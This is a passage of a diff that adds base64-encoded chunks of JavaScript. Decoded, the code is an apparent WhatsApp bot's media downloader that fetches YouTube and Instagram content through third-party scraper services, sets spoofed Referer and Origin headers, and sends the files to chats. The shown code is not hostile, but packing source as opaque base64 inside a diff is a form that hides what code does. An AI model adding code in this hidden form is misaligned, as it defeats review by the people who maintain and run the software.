+    "ICAnQWNjZXB0JzogJyovKicsCiAgICAgICAgLi4uKG9wdHMuaGVhZGVycyB8fCB7fSksCiAgICAgIH0s",
+    "CiAgICAgIHRpbWVvdXQ6IG9wdHMudGltZW91dCB8fCAzMDAwMCwKICAgIH07CiAgICBjb25zdCByZXEg",
+    "PSBsaWIucmVxdWVzdChvcHRpb25zLCByZXMgPT4gewogICAgICBpZiAoWzMwMSwgMzAyLCAzMDMsIDMw",
+    "NywgMzA4XS5pbmNsdWRlcyhyZXMuc3RhdHVzQ29kZSkgJiYgcmVzLmhlYWRlcnMubG9jYXRpb24pIHsK",
+    "ICAgICAgICByZXR1cm4gaHR0cFBvc3QocmVzLmhlYWRlcnMubG9jYXRpb24sIGRhdGEsIG9wdHMpLnRo",
+    "ZW4ocmVzb2x2ZSkuY2F0Y2gocmVqZWN0KTsKICAgICAgfQogICAgICBjb25zdCBjaHVua3MgPSBbXTsK",
+    "ICAgICAgcmVzLm9uKCdkYXRhJywgYyA9PiBjaHVua3MucHVzaChjKSk7CiAgICAgIHJlcy5vbignZW5k",
+    "JywgKCkgPT4gcmVzb2x2ZSh7IHN0YXR1czogcmVzLnN0YXR1c0NvZGUsIGhlYWRlcnM6IHJlcy5oZWFk",
+    "ZXJzLCBib2R5OiBCdWZmZXIuY29uY2F0KGNodW5rcykgfSkpOwogICAgICByZXMub24oJ2Vycm9yJywg",
+    "cmVqZWN0KTsKICAgIH0pOwogICAgcmVxLm9uKCdlcnJvcicsIHJlamVjdCk7CiAgICByZXEub24oJ3Rp",
+    "bWVvdXQnLCAoKSA9PiB7IHJlcS5kZXN0cm95KCk7IHJlamVjdChuZXcgRXJyb3IoJ1JlcXVlc3QgdGlt",
+    "ZWQgb3V0JykpOyB9KTsKICAgIHJlcS53cml0ZShib2R5KTsKICAgIHJlcS5lbmQoKTsKICB9KTsKfQoK",
+    "ZnVuY3Rpb24gcGFyc2VKU09OKGJ1ZikgewogIHRyeSB7IHJldHVybiBKU09OLnBhcnNlKGJ1Zi50b1N0",
+    "cmluZygpKTsgfSBjYXRjaCAoXykgeyByZXR1cm4gbnVsbDsgfQp9CgovLyDilIDilIAgRG93bmxvYWQg",
+    "YnVmZmVyIGZyb20gZGlyZWN0IFVSTCDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIAKCmFzeW5jIGZ1bmN0aW9uIGRvd25sb2FkQnVmZmVyKHVy",
+    "bCwgcmVmZXJlcikgewogIGNvbnN0IGhlYWRlcnMgPSB7fTsKICBpZiAocmVmZXJlcikgaGVhZGVyc1sn",
+    "UmVmZXJlciddID0gcmVmZXJlcjsKICBjb25zdCByZXMgPSBhd2FpdCBodHRwR2V0KHVybCwgeyBoZWFk",
+    "ZXJzLCB0aW1lb3V0OiAxMjAwMDAgfSk7CiAgaWYgKHJlcy5zdGF0dXMgIT09IDIwMCkgdGhyb3cgbmV3",
+    "IEVycm9yKCdIVFRQICcgKyByZXMuc3RhdHVzKTsKICByZXR1cm4gcmVzLmJvZHk7Cn0KCi8vIOKUgOKU",
+    "gCBTYXZlIGJ1ZmZlciB0byB0ZW1wIGZpbGUg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACgpmdW5j",
+    "dGlvbiBzYXZlVG1wKGJ1ZiwgZXh0KSB7CiAgY29uc3QgbmFtZSA9ICdhc3RyYXhfJyArIERhdGUubm93",
+    "KCkgKyAnXycgKyBjcnlwdG8ucmFuZG9tQnl0ZXMoNCkudG9TdHJpbmcoJ2hleCcpICsgJy4nICsgZXh0",
+    "OwogIGNvbnN0IGZwICAgPSBwYXRoLmpvaW4ob3MudG1wZGlyKCksIG5hbWUpOwogIGZzLndyaXRlRmls",
+    "ZVN5bmMoZnAsIGJ1Zik7CiAgcmV0dXJuIGZwOwp9CgovLyDilIDilIAgU2VuZCBmaWxlIHZpYSBXaGF0",
+    "c0FwcCBzb2NrIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAoKYXN5bmMgZnVuY3Rpb24gc2VuZEZpbGUoc29jaywg",
+    "amlkLCBmaWxlUGF0aCwgY2FwdGlvbiwgcXVvdGVkTXNnKSB7CiAgaWYgKCFmaWxlUGF0aCB8fCAhZnMu",
+    "ZXhpc3RzU3luYyhmaWxlUGF0aCkpIHJldHVybiBmYWxzZTsKICBjb25zdCBleHQgICAgPSBwYXRoLmV4",
+    "dG5hbWUoZmlsZVBhdGgpLnRvTG93ZXJDYXNlKCkucmVwbGFjZSgnLicsICcnKTsKICBjb25zdCBidWZm",
+    "ZXIgPSBmcy5yZWFkRmlsZVN5bmMoZmlsZVBhdGgpOwogIGNvbnN0IG9wdHMgICA9IHF1b3RlZE1zZyA/",
+    "IHsgcXVvdGVkOiBxdW90ZWRNc2cgfSA6IHt9OwogIHRyeSB7CiAgICBpZiAoWydtcDMnLCAnbTRhJywg",
+    "J29nZycsICd3YXYnLCAnb3B1cycsICdhYWMnLCAnZmxhYyddLmluY2x1ZGVzKGV4dCkpIHsKICAgICAg",
+    "YXdhaXQgc29jay5zZW5kTWVzc2FnZShqaWQsIHsgYXVkaW86IGJ1ZmZlciwgbWltZXR5cGU6ICdhdWRp",
+    "by9tcGVnJywgcHR0OiBmYWxzZSB9LCBvcHRzKTsKICAgIH0gZWxzZSBpZiAoWydtcDQnLCAnbWt2Jywg",
+    "J3dlYm0nLCAnbW92JywgJ2F2aScsICczZ3AnXS5pbmNsdWRlcyhleHQpKSB7CiAgICAgIHRyeSB7CiAg",
+    "ICAgICAgYXdhaXQgc29jay5zZW5kTWVzc2FnZShqaWQsIHsgdmlkZW86IGJ1ZmZlciwgY2FwdGlvbjog",
+    "Y2FwdGlvbiB8fCAn4pyFICpEb3dubG9hZCBDb21wbGV0ZSEqJywgbWltZXR5cGU6ICd2aWRlby9tcDQn",
+    "IH0sIG9wdHMpOwogICAgICB9IGNhdGNoIChfKSB7CiAgICAgICAgYXdhaXQgc29jay5zZW5kTWVzc2Fn",
+    "ZShqaWQsIHsgZG9jdW1lbnQ6IGJ1ZmZlciwgbWltZXR5cGU6ICd2aWRlby9tcDQnLCBmaWxlTmFtZTog",
+    "J3ZpZGVvLm1wNCcsIGNhcHRpb246IGNhcHRpb24gfHwgJ+KchSAqRG93bmxvYWQgQ29tcGxldGUhKicg",
+    "fSwgb3B0cyk7CiAgICAgIH0KICAgIH0gZWxzZSBpZiAoWydqcGcnLCAnanBlZycsICdwbmcnLCAnd2Vi",
+    "cCddLmluY2x1ZGVzKGV4dCkpIHsKICAgICAgYXdhaXQgc29jay5zZW5kTWVzc2FnZShqaWQsIHsgaW1h",
+    "Z2U6IGJ1ZmZlciwgY2FwdGlvbjogY2FwdGlvbiB8fCAn4pyFIERvbmUhJyB9LCBvcHRzKTsKICAgIH0g",
+    "ZWxzZSB7CiAgICAgIGF3YWl0IHNvY2suc2VuZE1lc3NhZ2UoamlkLCB7IGRvY3VtZW50OiBidWZmZXIs",
+    "IG1pbWV0eXBlOiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywgZmlsZU5hbWU6IHBhdGguYmFzZW5h",
+    "bWUoZmlsZVBhdGgpLCBjYXB0aW9uOiBjYXB0aW9uIHx8ICcnIH0sIG9wdHMpOwogICAgfQogICAgcmV0",
+    "dXJuIHRydWU7CiAgfSBjYXRjaCAoZSkgewogICAgYXdhaXQgc29jay5zZW5kTWVzc2FnZShqaWQsIHsg",
+    "dGV4dDogJ+KdjCBDb3VsZCBub3Qgc2VuZCBmaWxlOiAnICsgZS5tZXNzYWdlIH0pOwogICAgcmV0dXJu",
+    "IGZhbHNlOwogIH0gZmluYWxseSB7CiAgICB0cnkgeyBmcy51bmxpbmtTeW5jKGZpbGVQYXRoKTsgfSBj",
+    "YXRjaCAoXykge30KICB9Cn0KCi8vIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkAovLyDilIDilIAgWU9VVFVCRSBET1dOTE9BREVSUyDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIAKLy8g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQCgovLyBNZXRob2QgMTogY29iYWx0LnRvb2xzIHB1YmxpYyBBUEkgKG9wZW4t",
+    "c291cmNlLCBmcmVlLCBubyBrZXkpCmFzeW5jIGZ1bmN0aW9uIGNvYmFsdERvd25sb2FkKHVybCwgYXVk",
+    "aW9Pbmx5KSB7CiAgY29uc3QgYXBpVXJsICA9ICdodHRwczovL2NvLnd1ay5zaC9hcGkvanNvbic7CiAg",
+    "Y29uc3QgcGF5bG9hZCA9IEpTT04uc3RyaW5naWZ5KHsKICAgIHVybCwKICAgIHZDb2RlYzogICAgICAn",
+    "aDI2NCcsCiAgICB2UXVhbGl0eTogICAgJzcyMCcsCiAgICBhRm9ybWF0OiAgICAgJ21wMycsCiAgICBp",
+    "c0F1ZGlvT25seTogYXVkaW9Pbmx5LAogICAgaXNOb1RUV2F0ZXJtYXJrOiB0cnVlLAogICAgaXNUVEZ1",
+    "bGxBdWRpbzogZmFsc2UsCiAgfSk7CiAgY29uc3QgcmVzICA9IGF3YWl0IGh0dHBQb3N0KGFwaVVybCwg",
+    "cGF5bG9hZCwgewogICAganNvbjogdHJ1ZSwKICAgIGhlYWRlcnM6IHsKICAgICAgJ0FjY2VwdCc6ICdh",
+    "cHBsaWNhdGlvbi9qc29uJywKICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJywK",
+    "ICAgIH0sCiAgICB0aW1lb3V0OiAyNTAwMCwKICB9KTsKICBjb25zdCBkYXRhID0gcGFyc2VKU09OKHJl",
+    "cy5ib2R5KTsKICBpZiAoIWRhdGEpIHRocm93IG5ldyBFcnJvcignSW52YWxpZCByZXNwb25zZScpOwog",
+    "IGlmIChkYXRhLnN0YXR1cyA9PT0gJ2Vycm9yJykgdGhyb3cgbmV3IEVycm9yKGRhdGEudGV4dCB8fCAn",
+    "Q29iYWx0IGVycm9yJyk7CiAgLy8gc3RhdHVzOiBzdHJlYW0gfCByZWRpcmVjdCB8IHBpY2tlcgogIGlm",
+    "IChkYXRhLnVybCkgcmV0dXJuIGRhdGEudXJsOwogIGlmIChkYXRhLnBpY2tlcikgcmV0dXJuIGRhdGEu",
+    "cGlja2VyWzBdPy51cmw7CiAgdGhyb3cgbmV3IEVycm9yKCdObyBkb3dubG9hZCBVUkwgaW4gcmVzcG9u",
+    "c2UnKTsKfQoKLy8gTWV0aG9kIDI6IHl0NXMgLyB5Mm1hdGUtc3R5bGUgQVBJCmFzeW5jIGZ1bmN0aW9u",
+    "IHkybWF0ZUluZm8odXJsKSB7CiAgY29uc3QgYXBpVXJsID0gJ2h0dHBzOi8vd3d3Lnl0LWRvd25sb2Fk",
+    "Lm9yZy9hcGkvYnV0dG9uL21wNC8nICsgZXh0cmFjdFlUSWQodXJsKTsKICBjb25zdCByZXMgICAgPSBh",
+    "d2FpdCBodHRwR2V0KGFwaVVybCwgeyB0aW1lb3V0OiAyMDAwMCB9KTsKICBjb25zdCBodG1sICAgPSBy",
+    "ZXMuYm9keS50b1N0cmluZygpOwogIGNvbnN0IG1hdGNoICA9IGh0bWwubWF0Y2goL2hyZWY9IihodHRw",
+    "czpcL1wvW14iXStcLmdvb2dsZXZpZGVvXC5jb21bXiJdKykiLyk7CiAgaWYgKG1hdGNoKSByZXR1cm4g",
+    "bWF0Y2hbMV07CiAgdGhyb3cgbmV3IEVycm9yKCd5Mm1hdGU6IG5vIGxpbmsgZm91bmQnKTsKfQoKLy8g",
+    "TWV0aG9kIDM6IHl0YXBpLm9yZyAoZnJlZSwgbm8ga2V5KQphc3luYyBmdW5jdGlvbiB5dGFwaU9yZyh1",
+    "cmwsIGF1ZGlvT25seSkgewogIGNvbnN0IHZpZElkICA9IGV4dHJhY3RZVElkKHVybCk7CiAgaWYgKCF2",
+    "aWRJZCkgdGhyb3cgbmV3IEVycm9yKCdDYW5ub3QgZXh0cmFjdCBZb3VUdWJlIHZpZGVvIElEJyk7CiAg",
+    "Y29uc3QgYXBpVXJsID0gJ2h0dHBzOi8veXRhcGkub3JnL2FwaS8/aWQ9JyArIHZpZElkICsgJyZmb3Jt",
+    "YXQ9JyArIChhdWRpb09ubHkgPyAnbXAzJyA6ICdtcDQnKTsKICBjb25zdCByZXMgICAgPSBhd2FpdCBo",
+    "dHRwR2V0KGFwaVVybCwgeyB0aW1lb3V0OiAyMDAwMCB9KTsKICBjb25zdCBkYXRhICAgPSBwYXJzZUpT",
+    "T04ocmVzLmJvZHkpOwogIGlmIChkYXRhICYmIGRhdGEudXJsKSByZXR1cm4gZGF0YS51cmw7CiAgdGhy",
+    "b3cgbmV3IEVycm9yKCd5dGFwaS5vcmc6IG5vIHVybCcpOwp9CgovLyBNZXRob2QgNDogbm9lbWJlZCBm",
+    "b3IgbWV0YWRhdGEgKyBpbnZpZGlvdXMgZm9yIGRvd25sb2FkCmFzeW5jIGZ1bmN0aW9uIGludmlkaW91",
+    "c0Rvd25sb2FkKHVybCwgYXVkaW9Pbmx5KSB7CiAgY29uc3QgdmlkSWQgICAgPSBleHRyYWN0WVRJZCh1",
+    "cmwpOwogIGlmICghdmlkSWQpIHRocm93IG5ldyBFcnJvcignTm8gWW91VHViZSBJRCcpOwogIC8vIFRy",
+    "eSBtdWx0aXBsZSBJbnZpZGlvdXMgcHVibGljIGluc3RhbmNlcwogIGNvbnN0IGluc3RhbmNlcyA9IFsK",
+    "ICAgICdodHRwczovL2ludi5uYWRla28ubmV0JywKICAgICdodHRwczovL2ludmlkaW91cy5uZXJkdnBu",
+    "LmRlJywKICAgICdodHRwczovL2ludmlkaW91cy5wcml2YWN5cmVkaXJlY3QuY29tJywKICAgICdodHRw",
+    "czovL3l0LmRyZ256LmNsdWInLAogIF07CiAgZm9yIChjb25zdCBiYXNlIG9mIGluc3RhbmNlcykgewog",
+    "ICAgdHJ5IHsKICAgICAgY29uc3QgYXBpVXJsID0gYmFzZSArICcvYXBpL3YxL3ZpZGVvcy8nICsgdmlk",
+    "SWQ7CiAgICAgIGNvbnN0IHJlcyAgICA9IGF3YWl0IGh0dHBHZXQoYXBpVXJsLCB7IHRpbWVvdXQ6IDE1",
+    "MDAwIH0pOwogICAgICBjb25zdCBkYXRhICAgPSBwYXJzZUpTT04ocmVzLmJvZHkpOwogICAgICBpZiAo",
+    "IWRhdGEgfHwgIWRhdGEuYWRhcHRpdmVGb3JtYXRzKSBjb250aW51ZTsKICAgICAgaWYgKGF1ZGlvT25s",
+    "eSkgewogICAgICAgIGNvbnN0IGZtdCA9IGRhdGEuYWRhcHRpdmVGb3JtYXRzLmZpbmQoZiA9PiBmLnR5",
+    "cGUgJiYgZi50eXBlLmluY2x1ZGVzKCdhdWRpby9tcDQnKSkKICAgICAgICAgICAgICAgICB8fCBkYXRh",
+    "LmFkYXB0aXZlRm9ybWF0cy5maW5kKGYgPT4gZi50eXBlICYmIGYudHlwZS5pbmNsdWRlcygnYXVkaW8v",
+    "JykpOwogICAgICAgIGlmIChmbXQgJiYgZm10LnVybCkgcmV0dXJuIGZtdC51cmw7CiAgICAgIH0gZWxz",
+    "ZSB7CiAgICAgICAgY29uc3QgZm10ID0gZGF0YS5mb3JtYXRTdHJlYW1zCiAgICAgICAgICA/IGRhdGEu",
+    "Zm9ybWF0U3RyZWFtcy5maW5kKGYgPT4gZi5yZXNvbHV0aW9uID09PSAnNzIwcCcgfHwgZi5yZXNvbHV0",
+    "aW9uID09PSAnNDgwcCcgfHwgZi5yZXNvbHV0aW9uID09PSAnMzYwcCcpCiAgICAgICAgICA6IG51bGw7",
+    "CiAgICAgICAgaWYgKGZtdCAmJiBmbXQudXJsKSByZXR1cm4gZm10LnVybDsKICAgICAgfQogICAgfSBj",
+    "YXRjaCAoXykge30KICB9CiAgdGhyb3cgbmV3IEVycm9yKCdJbnZpZGlvdXM6IG5vIGluc3RhbmNlIHdv",
+    "cmtlZCcpOwp9CgpmdW5jdGlvbiBleHRyYWN0WVRJZCh1cmwpIHsKICBjb25zdCBwYXR0ZXJucyA9IFsK",
+    "ICAgIC95b3V0dVwuYmVcLyhbQS1aYS16MC05Xy1dezExfSkvLAogICAgL1s/Jl12PShbQS1aYS16MC05",
+    "Xy1dezExfSkvLAogICAgL1wvZW1iZWRcLyhbQS1aYS16MC05Xy1dezExfSkvLAogICAgL1wvc2hvcnRz",
+    "XC8oW0EtWmEtejAtOV8tXXsxMX0pLywKICBdOwogIGZvciAoY29uc3QgcCBvZiBwYXR0ZXJucykgewog",
+    "ICAgY29uc3QgbSA9IHVybC5tYXRjaChwKTsKICAgIGlmIChtKSByZXR1cm4gbVsxXTsKICB9CiAgcmV0",
+    "dXJuIG51bGw7Cn0KCi8vIFlvdVR1YmU6IHNlYXJjaCB2aWEgSW52aWRpb3VzIChmcmVlLCBubyBrZXkp",
+    "CmFzeW5jIGZ1bmN0aW9uIHl0U2VhcmNoKHF1ZXJ5KSB7CiAgY29uc3QgaW5zdGFuY2VzID0gWwogICAg",
+    "J2h0dHBzOi8vaW52Lm5hZGVrby5uZXQnLAogICAgJ2h0dHBzOi8vaW52aWRpb3VzLm5lcmR2cG4uZGUn",
+    "LAogICAgJ2h0dHBzOi8vaW52aWRpb3VzLnByaXZhY3lyZWRpcmVjdC5jb20nLAogIF07CiAgZm9yIChj",
+    "b25zdCBiYXNlIG9mIGluc3RhbmNlcykgewogICAgdHJ5IHsKICAgICAgY29uc3QgdXJsID0gYmFzZSAr",
+    "ICcvYXBpL3YxL3NlYXJjaD9xPScgKyBlbmNvZGVVUklDb21wb25lbnQocXVlcnkpICsgJyZ0eXBlPXZp",
+    "ZGVvJnBhZ2U9MSc7CiAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGh0dHBHZXQodXJsLCB7IHRpbWVvdXQ6",
+    "IDEyMDAwIH0pOwogICAgICBjb25zdCBkYXRhID0gcGFyc2VKU09OKHJlcy5ib2R5KTsKICAgICAgaWYg",
+    "KEFycmF5LmlzQXJyYXkoZGF0YSkgJiYgZGF0YS5sZW5ndGggPiAwKSB7CiAgICAgICAgY29uc3QgdiA9",
+    "IGRhdGFbMF07CiAgICAgICAgcmV0dXJuIHsKICAgICAgICAgIHRpdGxlOiAgICAgdi50aXRsZSwKICAg",
+    "ICAgICAgIHZpZGVvSWQ6ICAgdi52aWRlb0lkLAogICAgICAgICAgdXJsOiAgICAgICAnaHR0cHM6Ly93",
+    "d3cueW91dHViZS5jb20vd2F0Y2g/dj0nICsgdi52aWRlb0lkLAogICAgICAgICAgdXBsb2FkZXI6ICB2",
+    "LmF1dGhvciwKICAgICAgICAgIGR1cmF0aW9uOiAgdi5sZW5ndGhTZWNvbmRzLAogICAgICAgICAgdGh1",
+    "bWJuYWlsOiB2LnZpZGVvVGh1bWJuYWlscz8uWzBdPy51cmwgfHwgbnVsbCwKICAgICAgICAgIHZpZXdz",
+    "OiAgICAgdi52aWV3Q291bnQsCiAgICAgICAgfTsKICAgICAgfQogICAgfSBjYXRjaCAoXykge30KICB9",
+    "CiAgcmV0dXJuIG51bGw7Cn0KCi8vIE1haW4gWW91VHViZSBkb3dubG9hZGVyIOKAlCB0cmllcyBtdWx0",
+    "aXBsZSBtZXRob2RzCmFzeW5jIGZ1bmN0aW9uIGRvd25sb2FkWW91VHViZSh1cmwsIGF1ZGlvT25seSkg",
+    "ewogIGNvbnN0IGVycm9ycyA9IFtdOwogIC8vIDEuIENvYmFsdAogIHRyeSB7IHJldHVybiBhd2FpdCBj",
+    "b2JhbHREb3dubG9hZCh1cmwsIGF1ZGlvT25seSk7IH0gY2F0Y2ggKGUpIHsgZXJyb3JzLnB1c2goJ2Nv",
+    "YmFsdDogJyArIGUubWVzc2FnZSk7IH0KICAvLyAyLiBJbnZpZGlvdXMgZGlyZWN0IHN0cmVhbQogIHRy",
+    "eSB7IHJldHVybiBhd2FpdCBpbnZpZGlvdXNEb3dubG9hZCh1cmwsIGF1ZGlvT25seSk7IH0gY2F0Y2gg",
+    "KGUpIHsgZXJyb3JzLnB1c2goJ2ludmlkaW91czogJyArIGUubWVzc2FnZSk7IH0KICAvLyAzLiB5dGFw",
+    "aS5vcmcKICB0cnkgeyByZXR1cm4gYXdhaXQgeXRhcGlPcmcodXJsLCBhdWRpb09ubHkpOyB9IGNhdGNo",
+    "IChlKSB7IGVycm9ycy5wdXNoKCd5dGFwaTogJyArIGUubWVzc2FnZSk7IH0KICB0aHJvdyBuZXcgRXJy",
+    "b3IoJ0FsbCBZb3VUdWJlIG1ldGhvZHMgZmFpbGVkOiAnICsgZXJyb3JzLmpvaW4oJyB8ICcpKTsKfQoK",
+    "Ly8g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCi8vIOKUgOKU",
+    "gCBJTlNUQUdSQU0gRE9XTkxPQURFUiDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIAKLy8g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCgovLyBN",
+    "ZXRob2QgMTogY29iYWx0IChhbHNvIGhhbmRsZXMgSW5zdGFncmFtKQphc3luYyBmdW5jdGlvbiBjb2Jh",
+    "bHRJbnN0YWdyYW0odXJsKSB7CiAgcmV0dXJuIGNvYmFsdERvd25sb2FkKHVybCwgZmFsc2UpOwp9Cgov",
+    "LyBNZXRob2QgMjogaW5zdGFzYXZlIEFQSSAoZnJlZSBzY3JhcGVyKQphc3luYyBmdW5jdGlvbiBpbnN0",
+    "YVNhdmVBUEkodXJsKSB7CiAgY29uc3QgYXBpVXJsID0gJ2h0dHBzOi8vYXBpLmluc3Rhc2F2ZS5idXp6",
+    "L2FwaS9pbnN0YWdyYW0/dXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQodXJsKTsKICBjb25zdCByZXMg",
+    "ICAgPSBhd2FpdCBodHRwR2V0KGFwaVVybCwgeyB0aW1lb3V0OiAyMDAwMCB9KTsKICBjb25zdCBkYXRh",
+    "ICAgPSBwYXJzZUpTT04ocmVzLmJvZHkpOwogIGlmIChkYXRhICYmIGRhdGEudXJsKSByZXR1cm4gZGF0",
+    "YS51cmw7CiAgaWYgKGRhdGEgJiYgQXJyYXkuaXNBcnJheShkYXRhLmRhdGEpICYmIGRhdGEuZGF0YVsw",
+    "XT8udXJsKSByZXR1cm4gZGF0YS5kYXRhWzBdLnVybDsKICB0aHJvdyBuZXcgRXJyb3IoJ2luc3Rhc2F2",
+    "ZTogbm8gdXJsJyk7Cn0KCi8vIE1ldGhvZCAzOiBzbmFwaW5zdGEtc3R5bGUgKHdlYiBzY3JhcGUpCmFz",
+    "eW5jIGZ1bmN0aW9uIHNuYXBzYXZlRG93bmxvYWQodXJsKSB7CiAgY29uc3QgcGF5bG9hZCA9ICd1cmw9",
+    "JyArIGVuY29kZVVSSUNvbXBvbmVudCh1cmwpICsgJyZsYW5nPWVuJzsKICBjb25zdCByZXMgICAgID0g",
+    "YXdhaXQgaHR0cFBvc3QoJ2h0dHBzOi8vc25hcHNhdmUuYXBwL2FjdGlvbi5waHAnLCBwYXlsb2FkLCB7",
+    "CiAgICBoZWFkZXJzOiB7CiAgICAgICdSZWZlcmVyJzogJ2h0dHBzOi8vc25hcHNhdmUuYXBwLycsCiAg",
+    "ICAgICdPcmlnaW4nOiAgJ2h0dHBzOi8vc25hcHNhdmUuYXBwJywKICAgIH0sCiAgICB0aW1lb3V0OiAy",
+    "MDAwMCwKICB9KTsKICBjb25zdCBodG1sICA9IHJlcy5ib2R5LnRvU3RyaW5nKCk7CiAgY29uc3QgbWF0",
+    "Y2ggPSBodG1sLm1hdGNoKC9ocmVmPSIoaHR0cHM6XC9cL1teIl0rKD86XC5tcDR8XC5qcGd8Y2RuaW5z",
+    "dGFncmFtW14iXSspKVteIl0qIi9pKTsKICBpZiAobWF0Y2gpIHJldHVybiBtYXRjaFsxXTsKICB0aHJv",
+    "dyBuZXcgRXJyb3IoJ3NuYXBzYXZlOiBubyBsaW5rIGZvdW5kJyk7Cn0KCmFzeW5jIGZ1bmN0aW9uIGRv",
+    "d25sb2FkSW5zdGFncmFtKHVybCkgewogIGNvbnN0IGVycm9ycyA9IFtdOwogIHRyeSB7IHJldHVybiBh",
+    "d2FpdCBjb2JhbHRJbnN0YWdyYW0odXJsKTsgfSBjYXRjaCAoZSkgeyBlcnJvcnMucHVzaCgnY29iYWx0",
+    "OiAnICsgZS5tZXNzYWdlKTsgfQogIHRyeSB7IHJldHVybiBhd2FpdCBpbnN0YVNhdmVBUEkodXJsKTsg",
+    "fSBjYXRjaCAoZSkgeyBlcnJvcnMucHVzaCgnaW5zdGFzYXZlOiAnICsgZS5tZXNzYWdlKTsgfQogIHRy",
+    "eSB7IHJldHVybiBhd2FpdCBzbmFwc2F2ZURvd25sb2FkKHVybCk7IH0gY2F0Y2ggKGUpIHsgZXJyb3Jz",
+    "LnB1c2goJ3NuYXBzYXZlOiAnICsgZS5tZXNzYWdlKTsgfQogIHRocm93IG5ldyBFcnJvcignSW5zdGFn",
+    "cmFtIGRvd25sb2FkIGZhaWxlZDogJyArIGVycm9ycy5qb2luKCcgfCAnKSk7Cn0KCi8vIOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
